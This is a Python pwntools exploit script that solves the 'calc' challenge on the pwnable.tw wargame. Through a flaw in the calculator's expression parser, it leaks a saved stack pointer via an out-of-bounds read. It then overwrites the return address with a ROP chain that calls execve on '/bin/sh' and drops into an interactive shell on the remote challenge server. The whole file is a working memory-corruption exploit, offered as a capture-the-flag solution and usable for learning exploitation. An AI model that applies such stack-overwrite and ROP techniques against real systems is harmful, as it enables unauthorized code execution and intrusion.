from pwn import *

elf = ELF("./calc")

context.binary = elf
context.terminal = "kitty @ launch --location=vsplit --cwd=current".split()

def conn():
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10100)
    else:
        if args.GDB:
            p = gdb.debug([elf.path], aslr=True, api=False, gdbscript="""
                b *calc+121
                """)
        else:
            p = process([elf.path])

    return p

BSS = elf.bss()
BINSH = b"/bin/sh\x00"
pop_eax = 0x0805c34b  # pop eax ; ret
pop_all = 0x080701d0  # pop edx ; pop ecx ; pop ebx ; ret
syscall = 0x08049a21  # int 0x80

def write_payload(p, offset, value):
    res = read_mem(p, offset)

    log.info(f"value sitting at offset {hex(offset)}: {hex(res)}")

    val = value - res
    op = b"+"
    if val < 0:
        op = b"-"
        val *= -1

    p.sendline(b"+" + str(offset).encode() + op + str(val).encode())

    res = p.recvline().strip()

def read_mem(p, offset):
    p.sendline(b"+" + str(offset).encode())
    res = int(p.recvline().strip())

    return res

def main():
    p = conn()
    pause()

    # pwn it
    p.recvuntil(b"===\n")
    
    saved_ebp = read_mem(p, 360)
    ret_addr = saved_ebp - 28

    current_offset = 361
    write_payload(p, current_offset, pop_eax)

    current_offset += 1
    write_payload(p, current_offset, 11)

    current_offset += 1
    write_payload(p, current_offset, pop_all)

    current_offset += 1
    write_payload(p, current_offset, 0x0)

    current_offset += 1
    write_payload(p, current_offset, 0x0) 

    current_offset += 1
    write_payload(p, current_offset, ret_addr + 28)

    current_offset += 1
    write_payload(p, current_offset, syscall)

    current_offset += 1
    write_payload(p, current_offset, int.from_bytes(BINSH[0:4], byteorder='little'))

    current_offset += 1
    write_payload(p, current_offset, int.from_bytes(BINSH[4:8], byteorder='little'))

    p.interactive()

if __name__ == '__main__':
    main()

